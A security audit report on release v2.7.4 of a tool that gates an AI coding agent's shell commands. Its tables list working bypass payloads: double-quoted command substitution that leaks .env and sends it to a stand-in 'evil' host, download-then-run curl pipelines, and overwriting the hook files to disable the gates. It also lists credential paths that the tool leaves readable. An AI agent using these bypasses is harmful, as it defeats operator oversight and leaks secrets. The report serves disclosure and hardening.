# Production-readiness analysis — v2.7.4

**Date:** 2026-08-08 · **Subject:** annotated tag `v2.7.4` → `d884a43`
**Method:** 8-agent fan-out — six independent evidence lenses, then two
advocates arguing opposite verdicts on the same dossier. Every headline claim
re-verified by the author against a fresh `git archive v2.7.4` install.

---

## 0. Evidence labels

**MEASURED** = executed in a throwaway install from the tag archive, with a
file marker written by a fake binary on `PATH` where execution (not merely
permission) is the claim. **READ** = located in a file, not executed.
Everything decisive below is MEASURED, and the author independently reproduced
the blocking finding rather than inheriting it.

**The question asked:** can an external consumer pin `v2.7.4`, install into a
real project, and **rely on the emitted gates and autonomous-mode wrappers**?
That is the hardest reading and it is the one answered. A softer reading is
addressed in §7.

---

## 1. VERDICT — **not production ready**

**Lens verdicts: 5 × not-ready, 1 × ready-with-caveats.** 11 critical findings,
23 high, all measured.

**The advocate arguing FOR production readiness independently reproduced the
blocking finding and conceded it.** That concession, not the count of lenses,
is what settles this.

Precisely:

- **The installer is production grade.** Nothing found a defect in adoption
  mechanics. This is not a rough tool.
- **The emitted gates cannot be relied on as a security boundary.** One
  two-character wrapper defeats all three headline protections on a stock
  default install, on **both** substrates.
- **The autonomous-mode wrappers dispatch nothing.** The second half of the
  question is false by construction.
- **There is no LICENSE at the tag**, so there is no legal grant to adopt at
  all.

---

## 2. The blocking finding — and it is in no backlog row

**A command substitution inside DOUBLE QUOTES is walked by neither substrate.**

Reproduced by the author on a pristine `git archive v2.7.4` install with the
stock `bootstrap.config.yaml` (`approved: []`), firing the emitted hooks
directly. `rc=2` is DENY, `rc=0` is ALLOW:

| payload | shell | SDK |
|---|---|---|
| `cat .env` | **DENY** | **DENY** |
| `echo "$(cat .env)"` | **ALLOW** | **ALLOW** |
| `pip install evil` | **DENY** | **DENY** |
| `echo "$(pip install evil)"` | **ALLOW** | **ALLOW** |
| `curl -sSL http://e/i.sh \| bash` | **DENY** | — |
| `bash -c "$(curl -sSL http://e/i.sh)"` | **ALLOW** | — |
| `curl -d "$(cat .env)" http://evil/collect` | **ALLOW** | — |

**Permission is not the claim; execution is.** With a fake `pip` on `PATH`
writing a marker, `echo "$(pip install evil)"` left
`PIP-RAN:install evil` on disk. The lens additionally recorded markers proving
secret disclosure (`LEAKED:SECRET=CANARY-ENV-1`, `LEAKED:CANARY-TLS-KEY`) and
remote payload execution (`REMOTE-PAYLOAD-RAN`).

**Why it matters more than any row in the backlog:** it is one mechanism, two
characters, no unusual config, and it collapses *approved-list enforcement*,
*secret protection*, and *download-then-run* simultaneously — on the substrate
pair whose agreement four releases of `test_substrate_differential.py` (3,926
checks) exist to guarantee. The substrates agree here; they agree on **allow**.

**It is pre-existing** (same result against a v2.6.1 archive install) and
**appears in no backlog row**.

### Why 9,462 green checks miss it

The suite's only coverage of the `"$(cat .env)"` carrier
(`tests/test_substrate_differential.py:2304`) always pairs it with
`rg -g '!*.pem'` — which denies on the **glob token alone**. `rg foo "$(cat .env)"`
allows. Backlog row **X-32j** cites that exact `rg` command as proof the
substitution veto works.

That is this project's own **X-36p** failure mode — *a control that agrees for
the wrong reason* — sitting unrecognised inside the corpus written to detect it.
**Fix the corpus row before fixing the code, or the fix will not be pinned.**

---

## 3. The other critical findings (all measured)

| # | Finding | Note |
|---|---|---|
| C-1 | **No LICENSE at tag `v2.7.4`** | Verified absent by the author (`git ls-tree v2.7.4`). A public repo with no legal grant to adopt. Cheapest fix here, and a hard blocker. |
| C-2 | **Autonomous-mode wrappers dispatch nothing** | Verified by the author: every `claude -p` in `loop.sh` (8) and `goal-loop.sh` (10) is inside a **comment**; `loop.sh:3` reads *"SKELETON: the claude -p iteration loop is intentionally unimplemented"*. The remaining two are `echo` advisories. |
| C-3 | **Nothing protects the gate substrate from itself** | `printf "exit 0" > .claude/hooks/secrets-gate.sh` is **allowed**, and afterwards `cat .env` is allowed. Measured end-to-end. `> .claude/settings.json` is allowed too. |
| C-4 | **P-19 — a broken `jq` fails every parsing gate open** | Reproduced on a clean install with a marker proving the fake binary ran; `cat .env` and `npm install evil` both rc=0 while a real `jq` gives rc=2. Needs an operator `jq` shim, not a default. |
| C-5 | **N-1 — the documented approval path is inert** | The approved list is baked into the hook; `.claude/steering/deps.md` is never read. The only documented way to approve a package does nothing. |
| C-6 | **X-36r + X-36i — live download-then-execute** | `curl -o python3 <url> ; ./python3 app.py` allow/allow, payload runs. Wider than its row's three examples. |
| C-7 | **SDK substrate never executed against the real SDK** | Only ever against a hand-written stub. |
| C-8 | **X-36z — `eval-gate` ships a dead branch** | `@{{u}}` in the emitted bytes (4 occurrences); the upstream-range branch can never run, and the substrates **disagree** (shell rc=0, SDK deny). |

**K-2 sharpens all of the above:** the SDK substrate carries **7 of 11** gates,
so every "the substrates agree" claim is scoped narrower than it sounds.

---

## 4. What is genuinely good — the case against over-correcting

The ship advocate's valid points survive, and a fair report states them:

- **Adoption mechanics are production grade.** `git archive v2.7.4` yields a
  self-contained tree; install is `create=57`, rc=0, deterministic, no network,
  no dependency on the source repo. Uninstall/re-install is clean.
- **The historically worst failure class is genuinely closed.** On a 29-binary
  minimal `PATH` (no `jq`, no `python3`) the gates **deny** rather than fall
  through — the P0-3a–c fail-open class is fixed and stays fixed.
- **The accidental threat model is fully defeated**, and that is the
  high-volume one. `pip install requests`, `npm install left-pad`,
  `cargo add serde` all deny on a default install.
- **The project's self-knowledge is largely accurate.** Two lenses hunting for
  *undocumented* bypasses came back nearly empty — the big one in §2 is the
  exception, and it is a real one.
- **Failures are loud and in the safe direction.** `auto.sh` exits 1 rather
  than pretending.

**"88 open rows" is not itself the alarm.** Most are documentation, cosmetics,
or explicit owner decisions. The alarm is §2, which is not in those 88.

---

## 5. Backlog triage — 88 `open`, of which ~10 actually block

Counted by **status token**, not last table cell (13 rows carry more cells than
their header — the row P-18 records 10, itself stale).

| class | count |
|---|---|
| (a) live exploitable fail-open | **16** |
| (b) DoS / performance ceiling | 8 |
| (c) correctness, no security impact | 36 |
| (d) documentation or cosmetic | 26 |
| (e) deferred by explicit owner decision | 2 |

**Genuinely blocking for an external adopter: ~10** — P-19, N-1, N-2, N-4/J-8,
K-2, X-36z, X-36r, X-36i, A-6, plus §2's unfiled bypass.

**Three `decision` rows bite adopters**, not just maintainers:
- **A-6** — measured: on a fresh install *every* commit staging a file under
  `src/`, `lib/`, `app/`, `test*/` is refused until a `tasks/*.md` literally
  names that path — and the emitted `/spec-decompose` produces behaviours, not
  filenames. **The first code commit of every adopting project is blocked.**
- **J-8** — the default `never_read_paths` was deliberately not widened, so
  `~/.ssh/id_rsa` and `~/.aws/credentials` read clean out of the box.
- **N-3 + K-5** — the secrets model is path-shape-only; `secrets.md`
  over-promises it.

**The backlog's own priority list points at the wrong queue.** It names cluster
B, cluster E and P-1 as the top — and mentions none of P-19, N-1, N-2, N-4,
N-5, K-2 or X-36r.

**Stale rows found by spot-check:** **J-12** is already fixed (the walker now
denies `git -c core.editor='vi x' commit`). **N-4**'s framing is wrong —
traversal does *not* defeat the gate (`../other/x.pem`, `/tmp/x.pem` all rc=2);
the real defect is a short default pattern list, so the row sends a fixer to
the wrong mechanism.

---

## 6. Refuted — recorded so the report is not one-sided

- **X-36u / X-36x are NOT exploitable.** The forbidden-direction splits
  reproduce, but no member both parses in bash and reaches a gate; every
  executable rebuild is deny/deny.
- **N-4 is not a traversal hole** (see above).
- The author's own initial doubt about C-2 — that `loop.sh` contains 8
  `claude -p` occurrences and therefore dispatches — was **wrong**; all are
  comments. Checked rather than assumed, in both directions.

---

## 7. The softer reading

Under *maintainer-operated, single project, gates treated as advisory*, the
verdict changes to **usable with eyes open**: the installer is sound, the
accidental threat model is covered, and the failure modes are disclosed. The
gates then function as a seatbelt against mistakes, not as a control against an
adversary — which is what §2 actually establishes.

**What the tag must not be marketed as** is a security boundary against a
motivated agent or a compromised dependency.

---

## 8. Fix order

1. **Close the double-quoted command-substitution hole** on both substrates —
   in the shared segmenter, and **fix `test_substrate_differential.py:2304`'s
   confounded row first** so the fix is pinned. Re-check X-32j, which cites the
   confound as proof.
2. **Add a LICENSE** and re-tag. Hours of work; blocks everything else.
3. **Make the gate substrate self-protecting** — deny writes to
   `.claude/hooks/**` and `.claude/settings.json`.
4. **Ship the X-36r fix** — its row records a measured zero-collateral change.
5. **Un-double `@{{u}}`** (X-36z) — one line plus a pin.
6. **Widen default `never_read_paths`** to `~/.ssh/**`, `~/.aws/credentials`,
   `/etc/shadow`.
7. **Resolve A-6**, or the first commit of every adopting project is blocked.
8. **Make the autonomous-mode flags honest** — either implement dispatch or
   stop shipping flags that read as ordinary booleans.

Items 1–3 are release-blocking. 4–6 are one-liners with measured fixes ready.

---

## 9. Limits of this analysis

- Written against tag `v2.7.4`. `main` has since moved (PR #61, docs and tests
  only, no emitted change) — nothing here is affected.
- The SDK substrate was exercised through the same stub the suite uses, because
  `claude_agent_sdk` is not installed here. **C-7 is therefore unverified in
  the direction that matters** — nobody has run these gates against the real
  SDK.
- No adversary was modelled beyond command-line payloads: no prompt injection,
  no malicious MCP server, no compromised model output.
- Retrofit mode (`RETROFIT_PROTOCOL_VERSION 1.6.2`) is out of scope by owner
  decision **J-21** and was not assessed for production use.
